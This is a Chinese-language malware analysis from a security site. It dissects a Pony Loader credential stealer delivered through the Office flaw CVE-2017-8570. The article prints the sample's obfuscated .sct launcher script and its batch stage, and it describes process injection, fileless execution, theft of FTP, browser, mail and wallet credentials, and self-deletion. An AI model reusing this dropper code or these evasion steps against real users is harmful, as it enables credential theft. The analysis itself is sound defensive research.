# Pony Loader窃密木马样本分析

阅读量 **333761**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-22 10:30:17

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01142fc2b12d8a7056.png)

## 前言

自从Pony
Loader源码在论坛出售，便大规模用于窃取用户隐私数据。钓鱼攻击为最常用的手法，核心代码不断改变、投递方式也因攻击者不同而变化。这里我们分析一个通过漏洞CVE-2017-8570运行并使核心窃密恶意代码无文件落地执行的较新型样本。

## 一、 投递部分

CVE-2017-8570漏洞为Microsoft Office的一个远程代码执行漏洞。因为Microsoft
PowerPoint执行时会初始化Script”Moniker对象，并在PowerPoint播放动画期间会激活该对象，导致执行sct脚本（Windows
Script Component）文件。攻击者可以通过欺骗用户运行含有CVE-2017-8570漏洞的PPT文件分发恶意程序。

###  1.1分析漏洞文档

使用rtfobj.py拆解取出文档中的对象（图中的后缀名为已修改内容），可以看到文档包含sct脚本文件和许多可执行文件，猜测逻辑上是接力执行关系。

![](https://p1.ssl.qhimg.com/t01c51a7b5a93145a83.png)

根据该漏洞的描述，最先执行的是sct脚本文件；如果文档包涵多个sct文件时，可通过分析sct文件或查看bin对象确认启动顺序和路径；该bin文件二进制内容显示，首先执行的是临时文件下的a.sct样本（不区分大小写）。

![](https://p3.ssl.qhimg.com/t01d75e2a6fed4f50e5.png)

1.样本a.sct的主要内容是运行样本ufFm.cmd，具体内容如下：

`<script>`  
`<![CDATA[`  
`function tbpofmq(hello)`  
`{`  
`_ActiveXObj = this['Act'+'iveXO'+'bject'];`  
`var nnqybb='ell';`  
`var unzhb='t.';`  
`var yybfex='rip';`  
`var unzznjf='WSc';`  
`var yubz='Sh';`  
`var shdkqn = new _ActiveXObj(unzznjf + yybfex + unzhb + yubz + nnqybb);`  
`shdkqn["Run"](hello, 0, 1);`  
`}`  
`var opznjaf='"';  
var unzk18="MD" + opznjaf;  
var mqiojnj3="C";  
var rtqnooznn5 ="m";  
var oonnzzh4="<";  
var nqyznfhw0=mqiojnj3+"mD ";  
var iqmzghsl= nqyznfhw0 + "/" + mqiojnj3 + " " + nqyznfhw0 + oonnzzh4 + " " +
opznjaf + "%Te" + rtqnooznn5 + "P%\ufFm.c" + unzk18;  
tbpofmq(iqmzghsl);]]>  
</script>`

2.样本ufFm.cmd的主要功能是启动itnqknf5.CMD：

`ECHO OFF`  
`set uninmqofhjs="%uSeRpRofilE%"`  
`set ntzyqjpa="appDataloCalTeMpblOCk.tXt"`  
`IF EXIST %uninmqofhjs%%ntzyqjpa% (exit) ELSE (copy NUL
%uninmqofhjs%%ntzyqjpa% & cd %temp% & START /b itnqknf5.CMD)`

3.样本itnqknf5.CMD的主要功能为：通过修改注册表改变word的安全设置选项；启动与之前名称相同的文档迷惑受害者；解压1.zip压缩包并启动压缩包中的saver.scr程序；最后删除之前的样本文件。具体代码如下：

![](https://p2.ssl.qhimg.com/t01222ee08d97665dad.png)

执行到这里，这一阶段的样本执行已经结束。通过以上内容成功执行了最后一层样本并开启了迷惑受害者选项。接下来分析的是最后启动的恶意安装程序。

###  1.2分析安装程序

通过分析发现这是一个使用NSIS制作的安装程序，即代码的核心功能由NSIS制作运行，能够起到了一定的免杀和混淆作用。所有使用该种方式运行的恶意代码其最开始的运行逻辑是相同的，类似于一个“壳”。

![](https://p4.ssl.qhimg.com/t01111e4ab7e1a28124.png)

我们将该文件解压发现共有两个文件夹，一个为NSIS运行时依赖的组件（白文件）：

![](https://p2.ssl.qhimg.com/t01a067d888ff9b5dbb.png)

另一个为恶意DLL和一个加密文件：

![](https://p4.ssl.qhimg.com/t0158ceac77572d1e4a.png)

从上图中得知主要运行的恶意代码存放在matchbooks.dll和Spelaeology中，但是要从NSIS程序开始调试，从而查找恶意代码是如何启动的。

####  1.2.1恶意代码无文件落地部分

调试得到核心代码地址位于00403c05：

![](https://p4.ssl.qhimg.com/t01efc8398fafd0c52d.png)

首先调用是放在临时文件下的system.dll(白文件)：

![](https://p0.ssl.qhimg.com/t014022028f1498f65d.png)

从system.dll中调用matchbooks.dll的kramnik导出函数：

![](https://p1.ssl.qhimg.com/t01b4e918467657a5b6.png)

Kramnik函数接下来调用load4导出函数，用来执行进程注入行为将恶意代码注入到新建的进程中躲避杀软的检测：

![](https://p4.ssl.qhimg.com/t01628c850781982bcf.png)

加载临时文件夹下的Spelaeology进行解密操作：

![](https://p1.ssl.qhimg.com/t01236214e52a6a5644.png)

创建同名进程saver.scr：

![](https://p4.ssl.qhimg.com/t01877a6c0f6f62be3b.png)

将解密后的可执行文件写入申请的内存空间：

![](https://p4.ssl.qhimg.com/t01471b4a7c73e4bf1d.png)

启动注入进程：

![](https://p0.ssl.qhimg.com/t01962f54a9666ca4db.png)

执行到此已经将恶意代码成功的无文件落地执行，接下来的内容将在内存中运行使得杀软难以检测。

## 二、窃密部分

接下来执行的恶意代码为Pony
Loader，是俄罗斯开发的窃密木马（参考资料[https://github.com/m0n0ph1/malware-1/tree/master/Pony）。](https://github.com/m0n0ph1/malware-1/tree/master/Pony)

首先通过读取注册表获得受害机的基本信息，用户名、应用程序列表等：

![](https://p3.ssl.qhimg.com/t014b4765266c747a52.png)

然后出现了一个有意思的字符串，攻击者使用“Mesoamerica”（解密字符串“Oguqcogtkec”得到）作为控制延迟的参数：

![](https://p0.ssl.qhimg.com/t01e39fd7320a5cbf1e.png)

之后在内存中解密出密码字典用于之后的用户登录，将所有的字符进行“减1”操作得到字典：

![](https://p5.ssl.qhimg.com/t01b5ded02d87369bde.png)

解密得到的结果如下：

![](https://p4.ssl.qhimg.com/t01278fc7c88da2e0b1.png)

接下来窃取FTP登陆凭证、浏览器登陆信息、邮件登陆信息、虚拟货币钱包等：

1.窃取FTP软件等登陆凭证，包括以下软件：

  * FARManager
  * Total Commander
  * WS_FTP
  * CuteFTP
  * FlashFXP
  * FileZilla
  * FTP Commander
  * BulletProof FTP
  * SmartFTP
  * TurboFTP
  * FFFTP
  * CoffeeCup FTP
  * CoreFTP
  * FTP Explorer
  * Frigate3 FTP
  * SecureFX
  * UltraFXP
  * FTPRush
  * WebSitePublisher
  * BitKinex
  * ExpanDrive
  * ClassicFTP
  * Fling
  * SoftX
  * Directory Opus
  * FreeFTP
  * DirectFTP (определяется как FreeFTP)
  * LeapFTP
  * WinSCP
  * 32bit FTP
  * NetDrive
  * WebDrive
  * FTP Control
  * Opera
  * WiseFTP
  * FTP Voyager
  * Firefox
  * FireFTP
  * SeaMonkey
  * Flock
  * Mozilla Suite Browser
  * LeechFTP
  * Odin Secure FTP Expert
  * WinFTP
  * FTP Surfer
  * FTPGetter
  * ALFTP
  * Internet Explorer
  * Dreamweaver
  * DeluxeFTP
  * Google Chrome
  * Chromium
  * SRWare Iron (определяется как Chromium)
  * ChromePlus
  * Bromium (Yandex Chrome)
  * Nichrome
  * Comodo Dragon
  * RockMelt
  * K-Meleon
  * Epic
  * Staff-FTP
  * AceFTP
  * Global Downloader
  * FreshFTP
  * BlazeFTP
  * NETFile
  * GoFTP
  * 3D-FTP
  * Easy FTP
  * Xftp
  * FTP Now
  * Robo-FTP
  * LinasFTP
  * Cyberduck
  * Putty
  * Notepad++ (NppFTP)
  * CoffeeCup Visual Site Designer
  * CoffeeCup Sitemapper (определяется как CoffeeCup FTP)
  * FTPShell
  * FTPInfo
  * NexusFile
  * FastStone Browser
  * CoolNovo
  * WinZip
  * Yandex.Internet
  * MyFTP
  * sherrod FTP
  * NovaFTP
  * Windows Mail
  * Windows Live Mail
  * Pocomail
  * Becky!
  * IncrediMail
  * The Bat!
  * Outlook
  * Thunderbird
  * FastTrackFTP
  * Я.Браузер
  * Electrum
  * MultiBit

FTP Disk

2.窃取火狐、opera、谷歌等浏览器中的登陆凭证

![](https://p3.ssl.qhimg.com/t01fbb7a6153c5cf17d.png)

3.窃取邮件信息

![](https://p4.ssl.qhimg.com/t011c4102a3f62aa6c2.png)

4.窃取多种虚拟货币

![](https://p3.ssl.qhimg.com/t0104a2ddc04834c2bf.png)

将窃取的登陆凭证回传到C2:

![](https://p0.ssl.qhimg.com/t01712ef244c8a1e411.png)

使用之前解密出的硬编码字典测试受害机用户密码：

![](https://p5.ssl.qhimg.com/t012cbeb50f52949b44.png)

最后创建bat文件进行删除操作,擦除痕迹:

![](https://p5.ssl.qhimg.com/t016fb21eecdad82e5c.png)

## 三、总结

由于恶意代码重复利用简单、成本低廉，导致窃密等攻击成本降低，从而使得网络攻击行为更加密集、手段更加成熟。纵观该样本的攻击方式：整个过程一气呵成，偷完就跑；在每一个阶段都会更改或读取用户设置并在执行完恶意代码后删除相应样本防止被检测发现。除此之外，还将最终恶意代码隐藏在内存中运行躲避检测。  
在此提醒大家：养成良好的计算机使用习惯，防止躲避手段高明的恶意代码在个人PC执行给大家造成隐私、财产损失等。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **萌新大叔** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170654](/post/id/170654)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [无文件](/tag/无文件)
  * [Pony Loader](/tag/Pony Loader)

 **+1** __1赞

 __收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg) 萌新大叔

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

